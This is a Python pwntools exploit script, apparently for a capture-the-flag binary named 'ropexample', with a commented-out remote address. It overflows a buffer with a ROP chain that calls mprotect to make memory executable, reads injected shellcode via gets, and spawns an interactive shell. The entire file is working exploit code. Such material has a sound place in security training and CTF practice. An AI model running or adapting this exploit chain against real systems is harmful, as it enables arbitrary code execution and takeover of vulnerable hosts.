from pwn import *

# r = remote('10.10.10.246', 30151)
r = process('./ropexample')
elf = ELF('./ropexample')

# context.arch = 'amd64'
context.log_level = 'debug'

mprotect_addr = 0x41A3C0
# buf_addr = 0x401000
buf_addr = 0x4ac000
buf_size = 0x1000
buf_premit = 0x7

pop_rdi_rbp = 0x4021a8
pop_rsi_rbp = 0x405132
# 0x000000000046870c : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
pop_rdx_rbx_r12_r13_rbp = 0x46870c
ret = 0x40101a
main_addr = 0x401955
gets_addr = 0x404E40

# gdb.attach(r, 'b *0x41A3C0')

# int mprotect(void *addr, size_t len, int prot);  //函数原型
payload = b'A' * 0x28 + p64(pop_rdi_rbp) + p64(buf_addr) + p64(0) + p64(pop_rsi_rbp) + p64(buf_size) + p64(0) \
          + p64(pop_rdx_rbx_r12_r13_rbp) + p64(buf_premit) + p64(0) * 4 + p64(mprotect_addr)\
          + p64(gets_addr) + p64(buf_addr)  # mprotect函数之后跳转到gets函数向buf_addr位置打入shellcode
r.sendlineafter(b'World!', payload)

shellcode = asm(shellcraft.sh(), arch='amd64', os='linux')
r.sendline(shellcode)

r.interactive()
